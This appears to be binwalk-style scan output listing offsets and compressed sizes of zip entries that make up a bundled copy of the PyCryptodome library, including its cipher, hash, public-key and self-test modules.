+2508199       0x2645A7        Zip archive data, at least v2.0 to extract, compressed size: 8417, uncompressed size: 21434, name: Cryptodome/Cipher/__pycache__/_mode_ocb.cpython-311.pyc
+2516701       0x2666DD        Zip archive data, at least v2.0 to extract, compressed size: 9487, uncompressed size: 25849, name: Cryptodome/Cipher/__pycache__/_mode_ccm.cpython-311.pyc
+2526273       0x268C41        Zip archive data, at least v2.0 to extract, compressed size: 2646, uncompressed size: 7827, name: Cryptodome/IO/PKCS8.py
+2528971       0x2696CB        Zip archive data, at least v2.0 to extract, compressed size: 295, uncompressed size: 755, name: Cryptodome/IO/_PBES.pyi
+2529319       0x269827        Zip archive data, at least v2.0 to extract, compressed size: 764, uncompressed size: 1540, name: Cryptodome/IO/__init__.py
+2530138       0x269B5A        Zip archive data, at least v2.0 to extract, compressed size: 278, uncompressed size: 608, name: Cryptodome/IO/PKCS8.pyi
+2530469       0x269CA5        Zip archive data, at least v2.0 to extract, compressed size: 2719, uncompressed size: 6972, name: Cryptodome/IO/PEM.py
+2533238       0x26A776        Zip archive data, at least v2.0 to extract, compressed size: 169, uncompressed size: 303, name: Cryptodome/IO/PEM.pyi
+2533458       0x26A852        Zip archive data, at least v2.0 to extract, compressed size: 4721, uncompressed size: 19999, name: Cryptodome/IO/_PBES.py
+2538231       0x26BAF7        Zip archive data, at least v2.0 to extract, compressed size: 2042, uncompressed size: 5829, name: Cryptodome/Util/py3compat.py
+2540331       0x26C32B        Zip archive data, at least v2.0 to extract, compressed size: 7658, uncompressed size: 21204, name: Cryptodome/Util/RFC1751.py
+2548045       0x26E14D        Zip archive data, at least v2.0 to extract, compressed size: 3873, uncompressed size: 20376, name: Cryptodome/Util/_strxor.abi3.so
+2551979       0x26F0AB        Zip archive data, at least v2.0 to extract, compressed size: 805, uncompressed size: 3805, name: Cryptodome/Util/asn1.pyi
+2552838       0x26F406        Zip archive data, at least v2.0 to extract, compressed size: 173, uncompressed size: 290, name: Cryptodome/Util/Counter.pyi
+2553068       0x26F4EC        Zip archive data, at least v2.0 to extract, compressed size: 42, uncompressed size: 59, name: Cryptodome/Util/_cpu_features.pyi
+2553173       0x26F555        Zip archive data, at least v2.0 to extract, compressed size: 139, uncompressed size: 243, name: Cryptodome/Util/strxor.pyi
+2553368       0x26F618        Zip archive data, at least v2.0 to extract, compressed size: 296, uncompressed size: 975, name: Cryptodome/Util/number.pyi
+2553720       0x26F778        Zip archive data, at least v2.0 to extract, compressed size: 31391, uncompressed size: 96395, name: Cryptodome/Util/number.py
+2585166       0x27724E        Zip archive data, at least v2.0 to extract, compressed size: 89, uncompressed size: 100, name: Cryptodome/Util/_file_system.pyi
+2585317       0x2772E5        Zip archive data, at least v2.0 to extract, compressed size: 925, uncompressed size: 1951, name: Cryptodome/Util/__init__.py
+2586299       0x2776BB        Zip archive data, at least v2.0 to extract, compressed size: 7594, uncompressed size: 36205, name: Cryptodome/Util/asn1.py
+2593946       0x27949A        Zip archive data, at least v2.0 to extract, compressed size: 1059, uncompressed size: 2183, name: Cryptodome/Util/_file_system.py
+2595066       0x2798FA        Zip archive data, at least v2.0 to extract, compressed size: 3328, uncompressed size: 19304, name: Cryptodome/Util/_cpuid_c.abi3.so
+2598456       0x27A638        Zip archive data, at least v2.0 to extract, compressed size: 3723, uncompressed size: 10564, name: Cryptodome/Util/_raw_api.py
+2602236       0x27B4FC        Zip archive data, at least v2.0 to extract, compressed size: 1696, uncompressed size: 5449, name: Cryptodome/Util/strxor.py
+2603987       0x27BBD3        Zip archive data, at least v2.0 to extract, compressed size: 372, uncompressed size: 837, name: Cryptodome/Util/py3compat.pyi
+2604418       0x27BD82        Zip archive data, at least v2.0 to extract, compressed size: 349, uncompressed size: 906, name: Cryptodome/Util/_raw_api.pyi
+2604825       0x27BF19        Zip archive data, at least v2.0 to extract, compressed size: 137, uncompressed size: 238, name: Cryptodome/Util/Padding.pyi
+2605019       0x27BFDB        Zip archive data, at least v2.0 to extract, compressed size: 1434, uncompressed size: 3213, name: Cryptodome/Util/Counter.py
+2606509       0x27C5AD        Zip archive data, at least v2.0 to extract, compressed size: 871, uncompressed size: 1997, name: Cryptodome/Util/_cpu_features.py
+2607442       0x27C952        Zip archive data, at least v2.0 to extract, compressed size: 1555, uncompressed size: 4317, name: Cryptodome/Util/Padding.py
+2609053       0x27CF9D        Zip archive data, at least v2.0 to extract, compressed size: 117, uncompressed size: 159, name: Cryptodome/Util/RFC1751.pyi
+2609227       0x27D04B        Zip archive data, at least v2.0 to extract, compressed size: 23914, uncompressed size: 67169, name: Cryptodome/Util/__pycache__/number.cpython-311.pyc
+2633221       0x282E05        Zip archive data, at least v2.0 to extract, compressed size: 747, uncompressed size: 1273, name: Cryptodome/Util/__pycache__/_file_system.cpython-311.pyc
+2634054       0x283146        Zip archive data, at least v2.0 to extract, compressed size: 439, uncompressed size: 901, name: Cryptodome/Util/__pycache__/_cpu_features.cpython-311.pyc
+2634580       0x283354        Zip archive data, at least v2.0 to extract, compressed size: 3061, uncompressed size: 7963, name: Cryptodome/Util/__pycache__/py3compat.cpython-311.pyc
+2637724       0x283F9C        Zip archive data, at least v2.0 to extract, compressed size: 573, uncompressed size: 1142, name: Cryptodome/Util/__pycache__/__init__.cpython-311.pyc
+2638379       0x28422B        Zip archive data, at least v2.0 to extract, compressed size: 1873, uncompressed size: 4794, name: Cryptodome/Util/__pycache__/strxor.cpython-311.pyc
+2640332       0x2849CC        Zip archive data, at least v2.0 to extract, compressed size: 6639, uncompressed size: 14275, name: Cryptodome/Util/__pycache__/_raw_api.cpython-311.pyc
+2647053       0x28640D        Zip archive data, at least v2.0 to extract, compressed size: 987, uncompressed size: 1949, name: Cryptodome/SelfTest/st_common.py
+2648102       0x286826        Zip archive data, at least v2.0 to extract, compressed size: 1459, uncompressed size: 3225, name: Cryptodome/SelfTest/__init__.py
+2649622       0x286E16        Zip archive data, at least v2.0 to extract, compressed size: 2823, uncompressed size: 8522, name: Cryptodome/SelfTest/loader.py
+2652504       0x287958        Zip archive data, at least v2.0 to extract, compressed size: 804, uncompressed size: 1573, name: Cryptodome/SelfTest/__main__.py
+2653369       0x287CB9        Zip archive data, at least v2.0 to extract, compressed size: 6405, uncompressed size: 32404, name: Cryptodome/SelfTest/Math/test_Numbers.py
+2659844       0x289604        Zip archive data, at least v2.0 to extract, compressed size: 2026, uncompressed size: 4901, name: Cryptodome/SelfTest/Math/test_Primality.py
+2661942       0x289E36        Zip archive data, at least v2.0 to extract, compressed size: 984, uncompressed size: 2218, name: Cryptodome/SelfTest/Math/__init__.py
+2662992       0x28A250        Zip archive data, at least v2.0 to extract, compressed size: 2262, uncompressed size: 4876, name: Cryptodome/SelfTest/Math/test_modmult.py
+2665324       0x28AB6C        Zip archive data, at least v2.0 to extract, compressed size: 2705, uncompressed size: 8135, name: Cryptodome/SelfTest/Math/test_modexp.py
+2668098       0x28B642        Zip archive data, at least v2.0 to extract, compressed size: 3980, uncompressed size: 13601, name: Cryptodome/SelfTest/Signature/test_pkcs1_15.py
+2672154       0x28C61A        Zip archive data, at least v2.0 to extract, compressed size: 756, uncompressed size: 1558, name: Cryptodome/SelfTest/Signature/__init__.py
+2672981       0x28C955        Zip archive data, at least v2.0 to extract, compressed size: 5397, uncompressed size: 15867, name: Cryptodome/SelfTest/Signature/test_pss.py
+2678449       0x28DEB1        Zip archive data, at least v2.0 to extract, compressed size: 10233, uncompressed size: 24182, name: Cryptodome/SelfTest/Signature/test_eddsa.py
+2688755       0x2906F3        Zip archive data, at least v2.0 to extract, compressed size: 18810, uncompressed size: 57130, name: Cryptodome/SelfTest/Signature/test_dss.py
+2707636       0x2950B4        Zip archive data, at least v2.0 to extract, compressed size: 4073, uncompressed size: 10972, name: Cryptodome/SelfTest/Cipher/test_pkcs1_15.py
+2711782       0x2960E6        Zip archive data, at least v2.0 to extract, compressed size: 2139, uncompressed size: 6474, name: Cryptodome/SelfTest/Cipher/test_ARC2.py
+2713990       0x296986        Zip archive data, at least v2.0 to extract, compressed size: 2272, uncompressed size: 6585, name: Cryptodome/SelfTest/Cipher/test_DES3.py
+2716331       0x2972AB        Zip archive data, at least v2.0 to extract, compressed size: 3219, uncompressed size: 17336, name: Cryptodome/SelfTest/Cipher/common.py
+2719616       0x297F80        Zip archive data, at least v2.0 to extract, compressed size: 4434, uncompressed size: 15951, name: Cryptodome/SelfTest/Cipher/test_DES.py
+2724118       0x299116        Zip archive data, at least v2.0 to extract, compressed size: 3468, uncompressed size: 16085, name: Cryptodome/SelfTest/Cipher/test_CFB.py
+2727654       0x299EE6        Zip archive data, at least v2.0 to extract, compressed size: 6700, uncompressed size: 32667, name: Cryptodome/SelfTest/Cipher/test_OCB.py
+2734422       0x29B956        Zip archive data, at least v2.0 to extract, compressed size: 10532, uncompressed size: 24995, name: Cryptodome/SelfTest/Cipher/test_ARC4.py
+2745023       0x29E2BF        Zip archive data, at least v2.0 to extract, compressed size: 7462, uncompressed size: 37308, name: Cryptodome/SelfTest/Cipher/test_GCM.py
+2752553       0x2A0029        Zip archive data, at least v2.0 to extract, compressed size: 4119, uncompressed size: 20222, name: Cryptodome/SelfTest/Cipher/test_CBC.py
+2756740       0x2A1084        Zip archive data, at least v2.0 to extract, compressed size: 1339, uncompressed size: 3291, name: Cryptodome/SelfTest/Cipher/test_CAST.py
+2758148       0x2A1604        Zip archive data, at least v2.0 to extract, compressed size: 2691, uncompressed size: 8497, name: Cryptodome/SelfTest/Cipher/test_OpenPGP.py
+2760911       0x2A20CF        Zip archive data, at least v2.0 to extract, compressed size: 1033, uncompressed size: 3708, name: Cryptodome/SelfTest/Cipher/__init__.py
+2762012       0x2A251C        Zip archive data, at least v2.0 to extract, compressed size: 6471, uncompressed size: 20340, name: Cryptodome/SelfTest/Cipher/test_ChaCha20.py
+2768556       0x2A3EAC        Zip archive data, at least v2.0 to extract, compressed size: 7250, uncompressed size: 22322, name: Cryptodome/SelfTest/Cipher/test_pkcs1_oaep.py
+2775881       0x2A5B49        Zip archive data, at least v2.0 to extract, compressed size: 2529, uncompressed size: 9395, name: Cryptodome/SelfTest/Cipher/test_OFB.py
+2778478       0x2A656E        Zip archive data, at least v2.0 to extract, compressed size: 7375, uncompressed size: 16607, name: Cryptodome/SelfTest/Cipher/test_Salsa20.py
+2785925       0x2A8285        Zip archive data, at least v2.0 to extract, compressed size: 2676, uncompressed size: 7242, name: Cryptodome/SelfTest/Cipher/test_Blowfish.py
+2788674       0x2A8D42        Zip archive data, at least v2.0 to extract, compressed size: 4085, uncompressed size: 19967, name: Cryptodome/SelfTest/Cipher/test_SIV.py
+2792827       0x2A9D7B        Zip archive data, at least v2.0 to extract, compressed size: 22866, uncompressed size: 71751, name: Cryptodome/SelfTest/Cipher/test_AES.py
+2815761       0x2AF711        Zip archive data, at least v2.0 to extract, compressed size: 5997, uncompressed size: 28853, name: Cryptodome/SelfTest/Cipher/test_EAX.py
+2821826       0x2B0EC2        Zip archive data, at least v2.0 to extract, compressed size: 4863, uncompressed size: 21334, name: Cryptodome/SelfTest/Cipher/test_CTR.py
+2826757       0x2B2205        Zip archive data, at least v2.0 to extract, compressed size: 7288, uncompressed size: 37332, name: Cryptodome/SelfTest/Cipher/test_CCM.py
+2834113       0x2B3EC1        Zip archive data, at least v2.0 to extract, compressed size: 6421, uncompressed size: 30742, name: Cryptodome/SelfTest/Cipher/test_ChaCha20_Poly1305.py
+2840616       0x2B5828        Zip archive data, at least v2.0 to extract, compressed size: 966, uncompressed size: 2002, name: Cryptodome/SelfTest/IO/__init__.py
+2841646       0x2B5C2E        Zip archive data, at least v2.0 to extract, compressed size: 8672, uncompressed size: 19126, name: Cryptodome/SelfTest/IO/test_PKCS8.py
+2850384       0x2B7E50        Zip archive data, at least v2.0 to extract, compressed size: 1228, uncompressed size: 4361, name: Cryptodome/SelfTest/IO/test_PBES.py
+2851677       0x2B835D        Zip archive data, at least v2.0 to extract, compressed size: 1430, uncompressed size: 5826, name: Cryptodome/SelfTest/Util/test_Padding.py
+2853177       0x2B8939        Zip archive data, at least v2.0 to extract, compressed size: 1835, uncompressed size: 10223, name: Cryptodome/SelfTest/Util/test_strxor.py
+2855081       0x2B90A9        Zip archive data, at least v2.0 to extract, compressed size: 2302, uncompressed size: 8546, name: Cryptodome/SelfTest/Util/test_number.py
+2857452       0x2B99EC        Zip archive data, at least v2.0 to extract, compressed size: 586, uncompressed size: 1121, name: Cryptodome/SelfTest/Util/test_rfc1751.py
+2858108       0x2B9C7C        Zip archive data, at least v2.0 to extract, compressed size: 892, uncompressed size: 2021, name: Cryptodome/SelfTest/Util/__init__.py
+2859066       0x2BA03A        Zip archive data, at least v2.0 to extract, compressed size: 1032, uncompressed size: 2292, name: Cryptodome/SelfTest/Util/test_Counter.py
+2860168       0x2BA488        Zip archive data, at least v2.0 to extract, compressed size: 4438, uncompressed size: 31276, name: Cryptodome/SelfTest/Util/test_asn1.py
+2864673       0x2BB621        Zip archive data, at least v2.0 to extract, compressed size: 3530, uncompressed size: 12007, name: Cryptodome/SelfTest/PublicKey/test_ECC_Curve25519.py
+2868285       0x2BC43D        Zip archive data, at least v2.0 to extract, compressed size: 8690, uncompressed size: 109175, name: Cryptodome/SelfTest/PublicKey/test_import_ECC.py
+2877053       0x2BE67D        Zip archive data, at least v2.0 to extract, compressed size: 4236, uncompressed size: 15016, name: Cryptodome/SelfTest/PublicKey/test_ECC_Ed448.py
+2881366       0x2BF756        Zip archive data, at least v2.0 to extract, compressed size: 3147, uncompressed size: 10217, name: Cryptodome/SelfTest/PublicKey/test_ECC_Curve448.py
+2884593       0x2C03F1        Zip archive data, at least v2.0 to extract, compressed size: 3746, uncompressed size: 13948, name: Cryptodome/SelfTest/PublicKey/test_ECC_Ed25519.py
+2888418       0x2C12E2        Zip archive data, at least v2.0 to extract, compressed size: 3635, uncompressed size: 12660, name: Cryptodome/SelfTest/PublicKey/test_RSA.py
+2892124       0x2C215C        Zip archive data, at least v2.0 to extract, compressed size: 921, uncompressed size: 2684, name: Cryptodome/SelfTest/PublicKey/__init__.py
+2893116       0x2C253C        Zip archive data, at least v2.0 to extract, compressed size: 3147, uncompressed size: 9636, name: Cryptodome/SelfTest/PublicKey/test_DSA.py
+2896334       0x2C31CE        Zip archive data, at least v2.0 to extract, compressed size: 3465, uncompressed size: 8672, name: Cryptodome/SelfTest/PublicKey/test_ElGamal.py
+2899874       0x2C3FA2        Zip archive data, at least v2.0 to extract, compressed size: 3256, uncompressed size: 14384, name: Cryptodome/SelfTest/PublicKey/test_import_Curve25519.py
+2903215       0x2C4CAF        Zip archive data, at least v2.0 to extract, compressed size: 8862, uncompressed size: 27047, name: Cryptodome/SelfTest/PublicKey/test_import_RSA.py
+2912155       0x2C6F9B        Zip archive data, at least v2.0 to extract, compressed size: 10446, uncompressed size: 25521, name: Cryptodome/SelfTest/PublicKey/test_import_DSA.py
+2922679       0x2C98B7        Zip archive data, at least v2.0 to extract, compressed size: 2467, uncompressed size: 12512, name: Cryptodome/SelfTest/PublicKey/test_import_Curve448.py
+2925229       0x2CA2AD        Zip archive data, at least v2.0 to extract, compressed size: 8367, uncompressed size: 51842, name: Cryptodome/SelfTest/PublicKey/test_ECC_NIST.py
+2933672       0x2CC3A8        Zip archive data, at least v2.0 to extract, compressed size: 3762, uncompressed size: 9701, name: Cryptodome/SelfTest/Protocol/test_SecretSharing.py
+2937514       0x2CD2AA        Zip archive data, at least v2.0 to extract, compressed size: 5719, uncompressed size: 25087, name: Cryptodome/SelfTest/Protocol/test_ecdh.py
+2943304       0x2CE948        Zip archive data, at least v2.0 to extract, compressed size: 1107, uncompressed size: 2220, name: Cryptodome/SelfTest/Protocol/test_rfc1751.py
+2944485       0x2CEDE5        Zip archive data, at least v2.0 to extract, compressed size: 877, uncompressed size: 1859, name: Cryptodome/SelfTest/Protocol/__init__.py
+2945432       0x2CF198        Zip archive data, at least v2.0 to extract, compressed size: 12004, uncompressed size: 36872, name: Cryptodome/SelfTest/Protocol/test_KDF.py
+2957506       0x2D20C2        Zip archive data, at least v2.0 to extract, compressed size: 1953, uncompressed size: 7014, name: Cryptodome/SelfTest/Random/test_random.py
+2959530       0x2D28AA        Zip archive data, at least v2.0 to extract, compressed size: 837, uncompressed size: 1546, name: Cryptodome/SelfTest/Random/__init__.py
+2960435       0x2D2C33        Zip archive data, at least v2.0 to extract, compressed size: 2269, uncompressed size: 8710, name: Cryptodome/SelfTest/Hash/test_TupleHash.py
+2962776       0x2D3558        Zip archive data, at least v2.0 to extract, compressed size: 1711, uncompressed size: 3300, name: Cryptodome/SelfTest/Hash/test_MD5.py
+2964553       0x2D3C49        Zip archive data, at least v2.0 to extract, compressed size: 2579, uncompressed size: 9906, name: Cryptodome/SelfTest/Hash/common.py
+2967196       0x2D469C        Zip archive data, at least v2.0 to extract, compressed size: 3794, uncompressed size: 13392, name: Cryptodome/SelfTest/Hash/test_CMAC.py
+2971057       0x2D55B1        Zip archive data, at least v2.0 to extract, compressed size: 1502, uncompressed size: 2938, name: Cryptodome/SelfTest/Hash/test_SHA1.py
+2972626       0x2D5BD2        Zip archive data, at least v2.0 to extract, compressed size: 5600, uncompressed size: 19953, name: Cryptodome/SelfTest/Hash/test_HMAC.py
+2978293       0x2D71F5        Zip archive data, at least v2.0 to extract, compressed size: 1310, uncompressed size: 2851, name: Cryptodome/SelfTest/Hash/test_SHA3_256.py
+2979674       0x2D775A        Zip archive data, at least v2.0 to extract, compressed size: 4205, uncompressed size: 15025, name: Cryptodome/SelfTest/Hash/test_TurboSHAKE.py
+2983952       0x2D8810        Zip archive data, at least v2.0 to extract, compressed size: 1529, uncompressed size: 2722, name: Cryptodome/SelfTest/Hash/test_SHA384.py
+2985550       0x2D8E4E        Zip archive data, at least v2.0 to extract, compressed size: 2094, uncompressed size: 6820, name: Cryptodome/SelfTest/Hash/test_cSHAKE.py
+2987713       0x2D96C1        Zip archive data, at least v2.0 to extract, compressed size: 1308, uncompressed size: 2850, name: Cryptodome/SelfTest/Hash/test_SHA3_384.py
+2989092       0x2D9C24        Zip archive data, at least v2.0 to extract, compressed size: 2218, uncompressed size: 8909, name: Cryptodome/SelfTest/Hash/test_keccak.py
+2991379       0x2DA513        Zip archive data, at least v2.0 to extract, compressed size: 1064, uncompressed size: 3913, name: Cryptodome/SelfTest/Hash/__init__.py
+2992509       0x2DA97D        Zip archive data, at least v2.0 to extract, compressed size: 1308, uncompressed size: 2850, name: Cryptodome/SelfTest/Hash/test_SHA3_224.py
+2993888       0x2DAEE0        Zip archive data, at least v2.0 to extract, compressed size: 2013, uncompressed size: 5210, name: Cryptodome/SelfTest/Hash/test_SHA512.py
+2995970       0x2DB702        Zip archive data, at least v2.0 to extract, compressed size: 3521, uncompressed size: 16330, name: Cryptodome/SelfTest/Hash/test_BLAKE2.py
+2999560       0x2DC508        Zip archive data, at least v2.0 to extract, compressed size: 1684, uncompressed size: 4735, name: Cryptodome/SelfTest/Hash/test_SHAKE.py
+3001312       0x2DCBE0        Zip archive data, at least v2.0 to extract, compressed size: 5336, uncompressed size: 18329, name: Cryptodome/SelfTest/Hash/test_Poly1305.py
+3006719       0x2DE0FF        Zip archive data, at least v2.0 to extract, compressed size: 1882, uncompressed size: 3637, name: Cryptodome/SelfTest/Hash/test_SHA256.py
+3008670       0x2DE89E        Zip archive data, at least v2.0 to extract, compressed size: 1298, uncompressed size: 2336, name: Cryptodome/SelfTest/Hash/test_MD2.py
+3010034       0x2DEDF2        Zip archive data, at least v2.0 to extract, compressed size: 1422, uncompressed size: 2541, name: Cryptodome/SelfTest/Hash/test_SHA224.py
+3011525       0x2DF3C5        Zip archive data, at least v2.0 to extract, compressed size: 1310, uncompressed size: 2359, name: Cryptodome/SelfTest/Hash/test_MD4.py
+3012901       0x2DF925        Zip archive data, at least v2.0 to extract, compressed size: 3704, uncompressed size: 11734, name: Cryptodome/SelfTest/Hash/test_KangarooTwelve.py
+3016682       0x2E07EA        Zip archive data, at least v2.0 to extract, compressed size: 2845, uncompressed size: 11720, name: Cryptodome/SelfTest/Hash/test_KMAC.py
+3019594       0x2E134A        Zip archive data, at least v2.0 to extract, compressed size: 1494, uncompressed size: 2675, name: Cryptodome/SelfTest/Hash/test_RIPEMD160.py
+3021160       0x2E1968        Zip archive data, at least v2.0 to extract, compressed size: 1308, uncompressed size: 2851, name: Cryptodome/SelfTest/Hash/test_SHA3_512.py
+3022539       0x2E1ECB        Zip archive data, at least v2.0 to extract, compressed size: 37183, uncompressed size: 130104, name: Cryptodome/PublicKey/_curve25519.abi3.so
+3059792       0x2EB050        Zip archive data, at least v2.0 to extract, compressed size: 2, name: Cryptodome/PublicKey/__init__.pyi
+3059857       0x2EB091        Zip archive data, at least v2.0 to extract, compressed size: 8954, uncompressed size: 31165, name: Cryptodome/PublicKey/RSA.py
+3068868       0x2ED3C4        Zip archive data, at least v2.0 to extract, compressed size: 699270, uncompressed size: 967024, name: Cryptodome/PublicKey/_ec_ws.abi3.so
+3768203       0x397F8B        Zip archive data, at least v2.0 to extract, compressed size: 815, uncompressed size: 2591, name: Cryptodome/PublicKey/ECC.pyi
+3769076       0x3982F4        Zip archive data, at least v2.0 to extract, compressed size: 373, uncompressed size: 1725, name: Cryptodome/PublicKey/_point.pyi
+3769510       0x3984A6        Zip archive data, at least v2.0 to extract, compressed size: 2038, uncompressed size: 5146, name: Cryptodome/PublicKey/_openssh.py
+3771610       0x398CDA        Zip archive data, at least v2.0 to extract, compressed size: 3033, uncompressed size: 8631, name: Cryptodome/PublicKey/ElGamal.py
+3774704       0x3998F0        Zip archive data, at least v2.0 to extract, compressed size: 64644, uncompressed size: 223480, name: Cryptodome/PublicKey/_ed25519.abi3.so
+3839415       0x3A95B7        Zip archive data, at least v2.0 to extract, compressed size: 770, uncompressed size: 1812, name: Cryptodome/PublicKey/_curve.py
+3840245       0x3A98F5        Zip archive data, at least v2.0 to extract, compressed size: 3237, uncompressed size: 16471, name: Cryptodome/PublicKey/_point.py
+3843542       0x3AA5D6        Zip archive data, at least v2.0 to extract, compressed size: 1279, uncompressed size: 3146, name: Cryptodome/PublicKey/__init__.py
+3844883       0x3AAB13        Zip archive data, at least v2.0 to extract, compressed size: 297, uncompressed size: 674, name: Cryptodome/PublicKey/ElGamal.pyi
+3845242       0x3AAC7A        Zip archive data, at least v2.0 to extract, compressed size: 736, uncompressed size: 2529, name: Cryptodome/PublicKey/RSA.pyi
+3846036       0x3AAF94        Zip archive data, at least v2.0 to extract, compressed size: 2326, uncompressed size: 10181, name: Cryptodome/PublicKey/_nist_ecc.py
+3848425       0x3AB8E9        Zip archive data, at least v2.0 to extract, compressed size: 1332, uncompressed size: 5243, name: Cryptodome/PublicKey/_montgomery.py
+3849822       0x3ABE5E        Zip archive data, at least v2.0 to extract, compressed size: 1304, uncompressed size: 4679, name: Cryptodome/PublicKey/_edwards.py
+3851188       0x3AC3B4        Zip archive data, at least v2.0 to extract, compressed size: 11284, uncompressed size: 47971, name: Cryptodome/PublicKey/ECC.py
+3862529       0x3AF001        Zip archive data, at least v2.0 to extract, compressed size: 74664, uncompressed size: 241824, name: Cryptodome/PublicKey/_curve448.abi3.so
+3937261       0x3C13ED        Zip archive data, at least v2.0 to extract, compressed size: 79636, uncompressed size: 257712, name: Cryptodome/PublicKey/_ed448.abi3.so
+4016962       0x3D4B42        Zip archive data, at least v2.0 to extract, compressed size: 7253, uncompressed size: 22434, name: Cryptodome/PublicKey/DSA.py
+4024272       0x3D67D0        Zip archive data, at least v2.0 to extract, compressed size: 527, uncompressed size: 1381, name: Cryptodome/PublicKey/DSA.pyi
+4024857       0x3D6A19        Zip archive data, at least v2.0 to extract, compressed size: 149, uncompressed size: 324, name: Cryptodome/PublicKey/_openssh.pyi
+4025069       0x3D6AED        Zip archive data, at least v2.0 to extract, compressed size: 42, uncompressed size: 43, name: Cryptodome/Protocol/__init__.pyi
+4025173       0x3D6B55        Zip archive data, at least v2.0 to extract, compressed size: 632, uncompressed size: 1996, name: Cryptodome/Protocol/KDF.pyi
+4025862       0x3D6E06        Zip archive data, at least v2.0 to extract, compressed size: 6916, uncompressed size: 26176, name: Cryptodome/Protocol/_scrypt.abi3.so
+4032843       0x3D894B        Zip archive data, at least v2.0 to extract, compressed size: 1429, uncompressed size: 5644, name: Cryptodome/Protocol/DH.py
+4034327       0x3D8F17        Zip archive data, at least v2.0 to extract, compressed size: 326, uncompressed size: 798, name: Cryptodome/Protocol/SecretSharing.pyi
+4034720       0x3D90A0        Zip archive data, at least v2.0 to extract, compressed size: 772, uncompressed size: 1554, name: Cryptodome/Protocol/__init__.py
+4035553       0x3D93E1        Zip archive data, at least v2.0 to extract, compressed size: 310, uncompressed size: 709, name: Cryptodome/Protocol/DH.pyi
+4035919       0x3D954F        Zip archive data, at least v2.0 to extract, compressed size: 6905, uncompressed size: 22293, name: Cryptodome/Protocol/KDF.py
+4042880       0x3DB080        Zip archive data, at least v2.0 to extract, compressed size: 3261, uncompressed size: 8794, name: Cryptodome/Protocol/SecretSharing.py
+4046207       0x3DBD7F        Zip archive data, at least v2.0 to extract, compressed size: 12639, uncompressed size: 29921, name: Cryptodome/Protocol/__pycache__/KDF.cpython-311.pyc
+4058927       0x3DEF2F        Zip archive data, at least v2.0 to extract, compressed size: 182, uncompressed size: 209, name: Cryptodome/Protocol/__pycache__/__init__.cpython-311.pyc
+4059195       0x3DF03B        Zip archive data, at least v2.0 to extract, compressed size: 2042, uncompressed size: 5246, name: Cryptodome/Random/random.py
+4061294       0x3DF86E        Zip archive data, at least v2.0 to extract, compressed size: 195, uncompressed size: 367, name: Cryptodome/Random/__init__.pyi
+4061549       0x3DF96D        Zip archive data, at least v2.0 to extract, compressed size: 861, uncompressed size: 1813, name: Cryptodome/Random/__init__.py
+4062469       0x3DFD05        Zip archive data, at least v2.0 to extract, compressed size: 369, uncompressed size: 832, name: Cryptodome/Random/random.pyi
+4062896       0x3DFEB0        Zip archive data, at least v2.0 to extract, compressed size: 779, uncompressed size: 1508, name: Cryptodome/Random/__pycache__/__init__.cpython-311.pyc
+4063759       0x3E020F        Zip archive data, at least v2.0 to extract, compressed size: 19729, uncompressed size: 72064, name: Cryptodome/Hash/_SHA1.abi3.so
+4083547       0x3E4F5B        Zip archive data, at least v2.0 to extract, compressed size: 214, uncompressed size: 572, name: Cryptodome/Hash/KangarooTwelve.pyi
+4083825       0x3E5071        Zip archive data, at least v2.0 to extract, compressed size: 8031, uncompressed size: 26952, name: Cryptodome/Hash/_BLAKE2s.abi3.so
+4091918       0x3E700E        Zip archive data, at least v2.0 to extract, compressed size: 2075, uncompressed size: 6909, name: Cryptodome/Hash/SHA256.py
+4094048       0x3E7860        Zip archive data, at least v2.0 to extract, compressed size: 1179, uncompressed size: 3847, name: Cryptodome/Hash/TurboSHAKE128.py
+4095289       0x3E7D39        Zip archive data, at least v2.0 to extract, compressed size: 2065, uncompressed size: 6630, name: Cryptodome/Hash/MD5.py
+4097406       0x3E857E        Zip archive data, at least v2.0 to extract, compressed size: 2971, uncompressed size: 9445, name: Cryptodome/Hash/BLAKE2s.py
+4100433       0x3E9151        Zip archive data, at least v2.0 to extract, compressed size: 2063, uncompressed size: 6191, name: Cryptodome/Hash/SHA3_224.py
+4102553       0x3E9999        Zip archive data, at least v2.0 to extract, compressed size: 339, uncompressed size: 2064, name: Cryptodome/Hash/__init__.pyi
+4102950       0x3E9B26        Zip archive data, at least v2.0 to extract, compressed size: 6804, uncompressed size: 25024, name: Cryptodome/Hash/_ghash_portable.abi3.so
+4109823       0x3EB5FF        Zip archive data, at least v2.0 to extract, compressed size: 14272, uncompressed size: 45768, name: Cryptodome/Hash/_SHA224.abi3.so
+4124156       0x3EEDFC        Zip archive data, at least v2.0 to extract, compressed size: 3383, uncompressed size: 10532, name: Cryptodome/Hash/CMAC.py
+4127592       0x3EFB68        Zip archive data, at least v2.0 to extract, compressed size: 2077, uncompressed size: 6410, name: Cryptodome/Hash/RIPEMD160.py
+4129727       0x3F03BF        Zip archive data, at least v2.0 to extract, compressed size: 6419, uncompressed size: 23192, name: Cryptodome/Hash/_MD2.abi3.so
+4136204       0x3F1D0C        Zip archive data, at least v2.0 to extract, compressed size: 152, uncompressed size: 226, name: Cryptodome/Hash/KMAC256.pyi
+4136413       0x3F1DDD        Zip archive data, at least v2.0 to extract, compressed size: 94, uncompressed size: 144, name: Cryptodome/Hash/TupleHash256.pyi
+4136569       0x3F1E79        Zip archive data, at least v2.0 to extract, compressed size: 2482, uncompressed size: 8106, name: Cryptodome/Hash/Poly1305.py
+4139108       0x3F2864        Zip archive data, at least v2.0 to extract, compressed size: 2063, uncompressed size: 6191, name: Cryptodome/Hash/SHA3_256.py
+4141228       0x3F30AC        Zip archive data, at least v2.0 to extract, compressed size: 254, uncompressed size: 605, name: Cryptodome/Hash/SHA3_384.pyi
+4141540       0x3F31E4        Zip archive data, at least v2.0 to extract, compressed size: 11939, uncompressed size: 41632, name: Cryptodome/Hash/_keccak.abi3.so
+4153540       0x3F60C4        Zip archive data, at least v2.0 to extract, compressed size: 215, uncompressed size: 492, name: Cryptodome/Hash/MD2.pyi
+4153808       0x3F61D0        Zip archive data, at least v2.0 to extract, compressed size: 2320, uncompressed size: 6598, name: Cryptodome/Hash/MD4.py
+4156180       0x3F6B14        Zip archive data, at least v2.0 to extract, compressed size: 223, uncompressed size: 516, name: Cryptodome/Hash/RIPEMD160.pyi
+4156462       0x3F6C2E        Zip archive data, at least v2.0 to extract, compressed size: 215, uncompressed size: 492, name: Cryptodome/Hash/MD5.pyi
+4156730       0x3F6D3A        Zip archive data, at least v2.0 to extract, compressed size: 254, uncompressed size: 605, name: Cryptodome/Hash/SHA3_512.pyi
